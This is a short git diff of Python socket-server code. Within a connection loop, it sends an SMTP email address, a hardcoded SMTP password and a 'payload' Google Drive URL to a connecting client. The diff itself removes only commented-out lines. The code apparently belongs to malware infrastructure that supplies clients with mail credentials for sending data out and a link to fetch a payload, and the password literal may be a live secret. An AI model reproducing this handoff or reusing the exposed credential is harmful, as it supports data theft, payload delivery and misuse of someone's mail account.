@@ -28,9 +28,6 @@ with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
             credentials['smtp_password'] = "mmtxdnfzzvckqrhw"
             payload_URL = "https://drive.google.com/file/d/1A4n52slL4GNmDcdfFMo4Sg5aKguc191h/view?usp=sharing"
             conn.send(credentials['smtp_email'].encode() + b"\n" + credentials['smtp_password'].encode() + b"\n" + payload_URL.encode())
-            # conn.send(credentials['smtp_email'].encode())
-            # conn.send(credentials['smtp_password'].encode())
-            # conn.send(payload_URL.encode())
             break
 
 
